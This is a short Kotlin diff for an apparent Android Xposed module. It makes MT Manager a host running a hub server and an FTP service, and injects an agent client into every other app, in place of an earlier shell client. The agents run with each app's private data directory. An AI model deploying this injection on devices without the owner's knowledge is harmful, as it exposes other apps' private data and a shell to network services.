@@ -9,6 +9,10 @@ import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam
 import java.io.File
 
 class MainHook : IXposedHookLoadPackage {
+
+    // UPDATE THIS TO YOUR EXACT MT MANAGER PACKAGE NAME
+    private val HOST_PACKAGE = "bin.mt.plus.canary"
+
     override fun handleLoadPackage(lpparam: LoadPackageParam) {
         if (lpparam.packageName == "android") return
 
@@ -19,9 +23,15 @@ class MainHook : IXposedHookLoadPackage {
                 override fun afterHookedMethod(param: MethodHookParam) {
                     val context = param.thisObject as Context
                     val dataDir = File(context.applicationInfo.dataDir)
-                    
-                    // Start Client Thread
-                    ShellClient(dataDir).start()
+
+                    if (lpparam.packageName == HOST_PACKAGE) {
+                        // Role: HOST
+                        HubServer(9001).start()
+                        FtpService(2121).start()
+                    } else {
+                        // Role: AGENT
+                        AgentClient(dataDir).start()
+                    }
                 }
             }
         )
